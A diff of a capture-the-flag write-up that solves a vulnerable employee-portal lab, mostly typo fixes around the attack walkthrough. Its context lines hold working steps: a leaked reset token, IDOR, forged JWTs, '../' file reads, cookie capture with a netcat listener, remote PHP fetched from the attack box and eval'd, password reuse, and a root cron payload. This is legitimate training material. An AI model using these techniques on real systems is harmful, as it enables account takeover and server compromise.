@@ -27,16 +27,15 @@ The NexusCorp Employee Portal appears to be a typical internal application with 
 As an attacker, your objective is to observe how the application behaves, interact with its endpoints, and identify weak trust boundaries. By analysing requests, modifying parameters, and chaining vulnerabilities together, you can progressively escalate your access and move deeper into the system.
 
 _A single misstep can trigger a chain reaction, exploit each weakness in sequence and watch the system fall, one domino at a time._
-
 # Questions
-- What is the flag found in the admin user's profile notes?
-- What is the flag displayed on the admin panel after gaining admin access?
-- What is the flag obtained after achieving remote code execution on the server? Flag is stored in `/opt/flag3.txt`
-- What is the flag found in the **devops** user's home directory?
-- What is the root flag?
+- [[#Challenge 1 - What is the flag found in the admin user's profile notes?|Challenge 1]] - What is the flag found in the admin user's profile notes?
+- [[#Challenge 2 - What is the flag displayed on the admin panel after gaining admin access?|Challenge 2]] - What is the flag displayed on the admin panel after gaining admin access?
+- [[#Challenge 3 - What is the flag obtained after achieving remote code execution on the server? Flag is stored in `/opt/flag3.txt`|Challenge 3]] - What is the flag obtained after achieving remote code execution on the server? Flag is stored in `/opt/flag3.txt`
+- [[#Challenge 4 - What is the flag found in the **devops** user's home directory?|Challenge 4]] - What is the flag found in the **devops** user's home directory?
+- [[#Challenge 5 - What is the root flag?|Challenge 5]] - What is the root flag?
 # Decoding the task
 Let's summarise our initial understanding of the task. This will help identifying the playbook we will deploy:
-- "**Employee Portal**": This most likely means we web application. So we're dealing with website, PHP/Python/ASP/..., database, authentication.
+- "**Employee Portal**": This most likely means we have a web application. So we're dealing with website, PHP/Python/ASP/..., database, authentication.
 - "**authentication controls and role-based access**": Probably standard users and admin users (JWT, session cookies, privilege escalation).
 - "**multiple small weaknesses, ranging from misconfigurations to logic flaws"** gives us some hints on what to look for.
 - "**observe how the application behave**": Play around the website, search for hidden links, click on them and use tools like Burp Suite to see the communication.
@@ -153,7 +152,7 @@ Content-Type: text/html; charset=UTF-8
 At this stage, we have no usernames. but the "Our Teams" looks promising.
 
 # Analysing the "Our Team" page
-The "**Our Team**" page has the list of names and email address. **BINGO**! we have our usernames. This is a good source to harvest usernames. As typically, the username would be portion of the email address, we can harvest the info. There are 7 items here, so it would be easy to manually copy+paste, but let's for the fun of it, let's automate it.
+The "**Our Team**" page has the list of names and email address. **BINGO**! we have our usernames. This is a good source to harvest usernames. As typically, the username would be a portion of the email address, we can harvest the info. There are 7 items here, so it would be easy to manually copy+paste, but let's for the fun of it, automate it.
 
 ![[domino_02.png]]
 
@@ -169,7 +168,7 @@ cd $HOME/challenge
 # clone the project, but don't download all the files
 git clone --filter=blob:none --sparse https://github.com/narehvan/cyber-microtools.git
 
-# change the directory to the prject directory
+# change the directory to the project directory
 cd cyber-microtools/
 
 # Download
@@ -180,7 +179,7 @@ cd $HOME/challenge
 python3 $HOME/challenge/cyber-microtools/emailharvester/emailharvester.py -o emails.txt $URL/team.php
 ```
 
-Using `cat emails.txt`, check the output. We have 7 email addresses scrapped from the site:
+Using `cat emails.txt`, check the output. We have 7 email addresses scraped from the site:
 
 ```bash
 david.brown@nexus.corp
@@ -230,19 +229,19 @@ cd $HOME/challenge/feroxbuster
 The `challenge_site_scrap.txt` file will be generated. We could just read this file, or we could format it as a tree so it is easier to see the nested directories. here is how to format it using the `https://github.com/narehvan/cyber-microtools/tree/main/url2webtree_pretty` tool:
 
 ```bash
-# Change directory to 
+# Change directory to $HOME/challenge
 cd $HOME/challenge
 
 # clone the project, but don't download all the files (if you haven't done it already in the previous step)
 git clone --filter=blob:none --sparse https://github.com/narehvan/cyber-microtools.git
 
-# change the directory to the prject directory
+# change the directory to the project directory
 cd $HOME/challenge/cyber-microtools/
 
-# Downlaod only the url2webtree_pretty
+# Download only the url2webtree_pretty
 git sparse-checkout set url2webtree_pretty
 
-# Assuming you ran the git command from ~/domino/feroxbuster
+# Assuming you ran the git command from $HOME/challenge
 cd $HOME/challenge
 python3 $HOME/challenge/cyber-microtools/url2webtree_pretty/url2_webtree_pretty.py challenge_site_scrap.txt > challenge_site_scrap_tree.txt
 ```
@@ -312,7 +311,7 @@ There are few interesting targets. Here is a list of attractive ones. It does no
 | `/api/auth/token.php`     | A token page?                                           |
 
 # Challenge 1 - What is the flag found in the admin user's profile notes?
-The question tells us that we need an admin user and we then need to find the notes under that user's profile. Based on the "team.php" page, the only admin is "James Wright". But remember the task is taking about roles, so it could be that other user is assigned an "admin" role:
+The question tells us that we need an admin user and we then need to find the notes under that user's profile. Based on the "team.php" page, the only admin is "James Wright". But remember the task is talking about roles, so it could be that another user is assigned an "admin" role:
 
 ![[domino_03.png]]
 
@@ -333,7 +332,7 @@ Attempting to reset the password for the user: `james.wright`, we get the messag
 
 Attempting to reset the password for "**laura.hayes**", we get a different message: `Password reset instructions have been sent to la****@nexus.corp`
 
-This could be a clue. To dig up what's happening, let's fire-up the Burp suite and then attempt find out for each of the users how the "Password Reset" behaves:
+This could be a clue. To dig up what's happening, let's fire-up the Burp Suite and then attempt to find out for each of the users how the "Password Reset" behaves:
 - It is a POST request
 - the body contains: `username=james.wright`
 - the response contains `<div class="alert alert-success">`
@@ -371,10 +370,10 @@ Content-Type: text/html; charset=UTF-8
 
 Let's automate it using `curl`. Remember we have the following already set:
 - the `URL` variable
-- the `$HOME/challenge/emails.txt` contains a list of all the emails scrapped from the `team.php` page
+- the `$HOME/challenge/emails.txt` contains a list of all the emails scraped from the `team.php` page
 
 ```bash
-# change directory to where the emails.txt is located 
+# change directory to $HOME/challenge where the emails.txt is located 
 cd $HOME/challenge
 
 # execute a command to loop through each email address and attempt to reset the password
@@ -418,7 +417,7 @@ Except the "**laura.hayes**", every other email gives the same message. There is
 >`forgot.php` only _masks_ the email for admins and otherwise tells us nothing actionable - there is no token in its response. Keep that in mind: the real flaw is on the **API** version of the same feature (`api/reset.php`), which, as we are about to see, returns the reset **token directly in the HTTP response** instead of emailing it. Same "password reset" feature, two very different trust boundaries - that asymmetry is the Challenge-1 enabler.
 
 ## Attempt to reset the password - the `/api` route
-Let's check the `/api` endpoint. Looking at the files/directories we scrapped, there are few interesting ones:
+Let's check the `/api` endpoint. Looking at the files/directories we scraped, there are few interesting ones:
 
 ```txt
 ├── api/  [301, -> /api/]
@@ -441,10 +440,10 @@ curl -X POST -H "Content-Type: application/json" -d '{"username":"test"}' $URL/a
 {"error":"No account found with that username"}
 ```
 
-Once way is to run it against a single user. But why not automate it against all 7 users at once:
+One way is to run it against a single user. But why not automate it against all 7 users at once:
 
 ```bash
-# change directory to where the emails.txt is located 
+# change directory to $HOME/challenge where the emails.txt is located 
 cd $HOME/challenge
 
 # Execute the command
@@ -527,7 +526,7 @@ The interesting option is the "my profile API". This shows a JSON file and a "no
 This is the best place to attempt IDOR: the `/profile.php?id=7` can be modified.
 
 ## IDOR attempt
-Extracting the request from Burp Suite, gives is the "Cookie" value and the request `GET /api/users/profile.php?id=7`
+Extracting the request from Burp Suite, gives us the "Cookie" value and the request `GET /api/users/profile.php?id=7`
 
 ```http
 GET /api/users/profile.php?id=7 HTTP/1.1
@@ -597,7 +596,8 @@ We have identified:
 - the flag for challenge 1,
 - the admin user who is "laura.hayes". This also explains why we couldn't simply reset the password (`api/reset.php` excluded her). It would have been too easy to find the flag.
 
-# Challenge 2: What is the flag displayed on the admin panel after gaining admin access?
+# Challenge 2 - What is the flag displayed on the admin panel after gaining admin access?
+
 Remember we had found the `admin` directory. This must be the admin panel:
 
 ```txt
@@ -636,7 +636,7 @@ As there is no method to provide credentials on the `/admin` page, let's check t
 - it contains two sections separated by a `.`:
 	- `eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6ImphbWVzLndyaWdodCIsInJvbGUiOiJ1c2VyIn0%3D`
 	- `a7cecefc21286f22950e0dfba228b0a44998a3d5e6e486134eb97e80d1dc687b`
-- the first segment ends with `%3D` which is URL-encoded (percent-encoded) representation of two consecutive equals signs== (`==`)
+- the first segment ends with `%3D` which is URL-encoded (percent-encoded) representation of an equal sign (`=`)
 
 Checking in `CyberChef`: converting it from `base64` reveals the two parts:
 - `{"user_id":7,"username":"james.wright","role":"user"}`
@@ -658,7 +658,7 @@ to
 
 `{"user_id":1,"username":"laura.hayes","role":"admin"}`
 
-The problem? the second part of the cookie is most likely the signature and requires a password to generate it. We don't have that password. (note that this is not the same password as the password of the user "laura.hayes"). What we can try is to forge the first part with the hope of that the application does not check the signature. Worth trying...
+The problem? the second part of the cookie is most likely the signature and requires a password to generate it. We don't have that password. (note that this is not the same password as the password of the user "laura.hayes"). What we can try is to forge the first part with the hope that the application does not check the signature. Worth trying...
 
 Save the contents of this file to `gen.py`
 
@@ -696,7 +696,6 @@ curl -s -b "nexus_session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm
 
 > [!Note] Note
 >We later confirmed from the source _why_ this had to fail Once we read `auth.php` (below), the cookie path turns out to be doubly locked:
-> 
 > - `get_session()` recomputes `hash_hmac('sha256', base64_json, APP_SECRET)` and rejects a bad signature - so a forged cookie without `APP_SECRET` is dropped.
 > - Even with a valid signature, the comment says _"Role always fetched from DB - cookie role value ignored"_ - so setting `role:admin` in the cookie would be ignored anyway; the role is re-read from the database by `user_id`.
 > 
@@ -764,7 +763,7 @@ Options?
 1. Brute force the password of "laura.hayes", or
 2. Try to forge the JWT token. This option looks easier to start with.
 
-Let's try the same trick as we did before: modify the payload part, hopping that the server will ignore the signature section. You can view the contents of the JWT token at https://www.jwt.io/.
+Let's try the same trick as we did before: modify the payload part, hoping that the server will ignore the signature section. You can view the contents of the JWT token at https://www.jwt.io/.
 
 Here is the code to try to forge it. Save it as `gen2.py` and execute it with `python gen2.py`:
 
@@ -822,17 +821,16 @@ Content-Type: application/json
 
 BINGO! we have succeeded to forge the token because we got `Access denied: path must be within \/var\/www\/html\/`. This means the authentication was successful because **the server does not check the JWT signature**, but it was not authorised to access files outside of the `/var/www/html`.
 
-> [!Info] The actual Challenge-2 vulnerability (confirmed later in `auth.php`) `verify_jwt()` has its signature verification **commented out**:
-> 
+> [!Info] Info
+> The actual [[#Challenge 2 - What is the flag displayed on the admin panel after gaining admin access?|Challenge 2]] vulnerability (confirmed later in `auth.php`) `verify_jwt()` has its signature verification **commented out**:
 > ```php
 > // Signature check intentionally disabled
 > // $expected = rtrim(base64_encode(hash_hmac('sha256', "$parts[0].$parts[1]", JWT_SECRET, true)),'=');
 > // if (!hash_equals($parts[2], $expected)) return null;
 > ```
-> 
 > So the JWT path trusts whatever `role` we put in the payload - we did **not** even need `JWT_SECRET` to forge an admin token; re-using any old signature string works. This is the asymmetry that defines the box: the **cookie** path is secure (HMAC checked + role from DB), but the **JWT** path is not (signature check disabled). Signing the token _properly_ later (once we leak `JWT_SECRET`) is cleaner, but strictly unnecessary.
 
-After several trial and errors, there are two logic that stands out:
+After several trial and errors, there are two points that stands out:
 1. The `reset.php` file can be easily downloaded.
 2. To download some other files, the filename must be prefixed with `../`, so `config.php` becomes `$URL/api/files.php?name=../config.php`"
 
@@ -870,13 +868,13 @@ Content-Type: application/json
 {"file":"\/var\/www\/html\/auth.php","content":"<?php\nrequire_once __DIR__ . '\/config.php';\n\nfunction get_session() {\n    if (!isset($_COOKIE['nexus_session'])) return null;\n    $raw = $_COOKIE['nexus_session'];\n    \/\/ Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)\n    $parts = explode('.', $raw, 2);\n    if (count($parts) !== 2) return null;\n    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);\n    if (!hash_equals($expected_sig, $parts[1])) return null;\n    $decoded = base64_decode($parts[0]);\n    $data = json_decode($decoded, true);\n    if (!$data || !isset($data['user_id'])) return null;\n    \/\/ Role always fetched from DB - cookie role value ignored\n    $db = get_db();\n    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');\n    $stmt->execute([$data['user_id']]);\n    return $stmt->fetch(PDO::FETCH_ASSOC);\n}\n\nfunction require_login() {\n    $user = get_session();\n    if (!$user) { header('Location: \/index.php'); exit; }\n    return $user;\n}\n\nfunction require_admin() {\n    $user = require_login();\n    if ($user['role'] !== 'admin') {\n        http_response_code(403);\n        header('Content-Type: application\/json');\n        echo json_encode(['error' => 'Forbidden']);\n        exit;\n    }\n    return $user;\n}\n\nfunction generate_jwt($username) {\n    $header = rtrim(base64_encode(json_encode(['alg'=>'HS256','typ'=>'JWT'])), '=');\n    \/\/ Bug: role always set to \"user\" regardless of actual user role\n    $payload = rtrim(base64_encode(json_encode([\n        'sub' => $username,\n        'role' => 'user',\n        'iat' => time(),\n        'exp' => time() + 3600\n    ])), '=');\n    $sig = rtrim(base64_encode(hash_hmac('sha256', \"$header.$payload\", JWT_SECRET, true)), '=');\n    return \"$header.$payload.$sig\";\n}\n\nfunction verify_jwt($token) {\n    $parts = explode('.', $token);\n    if (count($parts) !== 3) return null;\n    $payload = json_decode(base64_decode($parts[1]), true);\n    if (!$payload) return null;\n    \/\/ Signature check intentionally disabled\n    \/\/ $expected = rtrim(base64_encode(hash_hmac('sha256', \"$parts[0].$parts[1]\", JWT_SECRET, true)),'=');\n    \/\/ if (!hash_equals($parts[2], $expected)) return null;\n    if (isset($payload['exp']) && $payload['exp'] < time()) return null;\n    return $payload;\n}\n?>\n"}
 ```
 
-> [!Info] Read this file carefully - it is the heart of the box Two commented-out lines explain every success and failure so far:
-> 
+> [!Info] Read this file carefully. It is the heart of the box.
+> Two commented-out lines explain every success and failure so far:
 > - **Cookie is safe:** `get_session()` checks the HMAC _and_ re-reads the role from the DB (`// Role always fetched from DB - cookie role value ignored`). -> our cookie forge was doomed twice over.
 > - **JWT is unsafe:** `verify_jwt()` has `// Signature check intentionally disabled`. -> our JWT forge trusted the payload `role` and worked.
 > - Bonus: `generate_jwt()` hard-codes `'role' => 'user'`, so the _legitimate_ token endpoint will never hand out an admin token - forging is the only way.
 
-The new contents includes the `nrequire_once __DIR__ . '\/config.php`, so let's retrieve that:
+The new content includes the `require_once __DIR__ . '\/config.php`, so let's retrieve that:
 
 ```bash
 curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzU2NDE3OSwiZXhwIjoxNzkzNTY3Nzc5fQ.veE+PsumJc0msnLUUtQcMkq9NUMemVwCLHN3ZeLbPdA" $URL/api/files.php?name=../config.php
@@ -1133,7 +1131,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 ![[domino_15.png]]
 
-BINGO! The target machine attempts to download the `test.php` file. Of course this file doesn't exist, but this is a good sign. What can we do with this knowlege?
+BINGO! The target machine attempts to download the `test.php` file. Of course this file doesn't exist, but this is a good sign. What can we do with this knowledge?
 
 ```bash
 python3 -m http.server 80
@@ -1152,7 +1150,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 **start a web server**
 
 ```bash
-python -m http.server 80
+python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
@@ -1285,7 +1283,7 @@ we get the flag for challenge 2
 We have just captured **laura.hayes's live, validly-signed admin session cookie**.
 
 >[!Note] Instead of Wireshark
->Instead of using wireshark, we could have used `nc -lvnp 80` which would have given is the cookie right in the terminal:
+>Instead of using wireshark, we could have used `nc -lvnp 80` which would have given us the cookie right in the terminal:
 >```bash
 >nc -lvnp 80
 >Listening on 0.0.0.0 80
@@ -1326,7 +1324,7 @@ So the bug is precise: the reviewer **extracts every URL from the ticket and GET
 > [!Tip] Tip
 >A netcat listener shows the same cookie without Wireshark `nc -lvnp 80` prints the full inbound request (headers included), so the `Cookie:` line is visible in the terminal. Wireshark just makes a cleaner screenshot for the write-up.
 ## The RCE path for flag 3: Remote File Inclusion (RFI) via `files.php`
-Think back to how `files.php` behaved: `files.php?name=http://<our-ip>/...` actually **fetched our URL** earlier (we saw our Python web server get the hit). That is a clue. Let's get the contents of the `files.php` to see if we can find a vulnerability there:]. Reading the source confirms the mechanism - and it is not a classic `include()`; it is a **fetch-then-`eval`**:
+Think back to how `files.php` behaved: `files.php?name=http://<our-ip>/...` actually **fetched our URL** earlier (we saw our Python web server get the hit). That is a clue. Let's get the contents of the `files.php` to see if we can find a vulnerability there. Reading the source confirms the mechanism - and it is not a classic `include()`; it is a **fetch-then-`eval`**:
 
 ```bash
 curl -H "Authorization: Bearer $TOKEN" $URL/api/files.php?name=../api/files.php
@@ -1363,7 +1361,7 @@ if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
 > - The local-file branch runs `realpath()` and checks the `/var/www/html/` prefix - which is why earlier reads needed `../` and refused to leave the web root, while the **remote** branch has no such guard.
 
 
-BINGO!  It supports RFI (Remote File Invocation). This means we can use it to fetch a file from the attack box:
+BINGO!  It supports RFI (Remote File Inclusion - here implemented as fetch-then-eval). This means we can use it to fetch a file from the attack box:
 
 ```php
 // RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
@@ -1392,7 +1390,7 @@ if (strpos($name, \"http://\") === 0 || strpos($name, \"https://\") === 0) {
 **start a web server** on the attack box
 
 ```bash
-python -m http.server 80
+python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
@@ -1463,7 +1461,7 @@ cd /home/devops
 bash: cd: /home/devops: Permission denied
 ```
 
-We had identified passwords in the `config.php` file. Let's re-use those passwords (the `DB_PASS` value). This is quite common vulnerability:
+We had identified passwords in the `config.php` file. Let's re-use those passwords (the `DB_PASS` value). This is a quite common vulnerability:
 
 ```bash
 su - devops
@@ -1537,7 +1535,7 @@ find / -path /proc -prune -o -path /sys -prune -o -writable -type d -print 2>/de
 /var/www/html/api/auth
 ```
 
-From the list above, the `/opt` looks promissing:
+From the list above, the `/opt` looks promising:
 
 ```bash
 find /opt -writable -type f 2>/dev/null
@@ -1546,7 +1544,7 @@ find /opt -writable -type f 2>/dev/null
 ```
 
 > [!Note] Note
-> `/opt/admin_bot.py` ties back to Challenge 3 This is the "reviewer" that flips tickets from Pending -> Reviewed and is the target of the `create.php` stored-XSS path we deliberately did **not** use. Finding it here confirms the ticket feature was a side-path, not our RCE route.
+> `/opt/admin_bot.py` ties back to Challenge 3 This is the "reviewer" that flips tickets from Pending -> Reviewed and is the target of the `create.php` stored-XSS path we did **not** use for RCE. Finding it here confirms the ticket feature was a side-path, not our RCE route.
 ## Using pspy
 - **Download the pspy from github** on the attack box (https://github.com/DominicBreuker/pspy/releases).
 
@@ -1645,7 +1643,7 @@ Download the file:
 curl -s $URL/backup/config.enc -o config.enc
 ```
 
-The contents is encrypted with AES-128-ECB:
+The content is encrypted with AES-128-ECB:
 
 ```bash
 cat config.enc 
@@ -1712,7 +1710,7 @@ This is not useful and most likely a decoy to distract us.
 7. **Writable root cron** - `/opt/monitoring/health_report.sh` runs as root every minute and is `devops`-writable -> append payload -> **root** -> **Flag 5**.
 
 # Roads not taken / decoys
-- **Cookie forgery** - looked doomed at Challenge 2 (HMAC checked _and_ role re-read from DB in `auth.php`), but `admin_bot.py` later leaked `APP_SECRET = nexus_app_k3y_2024`. With that key the cookie _is_ forgeable offline - the road re-opened once we read the bot.
+- **Cookie forgery** - looked doomed at Challenge 2 (HMAC checked _and_ role re-read from DB in `auth.php`), but `admin_bot.py` later leaked `APP_SECRET = <password goes here>`. With that key the cookie _is_ forgeable offline - the road re-opened once we read the bot.
 - **Support-ticket "XSS"** - advertised by the source comment and the `bl1nd_x55` flag name, but the reviewer is a `requests` client, not a browser. The real bug is **SSRF**: the bot fetches ticket URLs with laura's admin cookie, which we capture (see Challenge 3). Not the RCE path, but it independently yields admin (Flag 2).
 - **`backup/config.enc`** - AES-128-ECB with a key leaked in `app.js`; decrypts to a decoy. Still worth citing as two genuine findings (secret-in-client-JS, weak ECB mode).
 - **Brute force** - avoided throughout; the logic flaws were always the intended path.
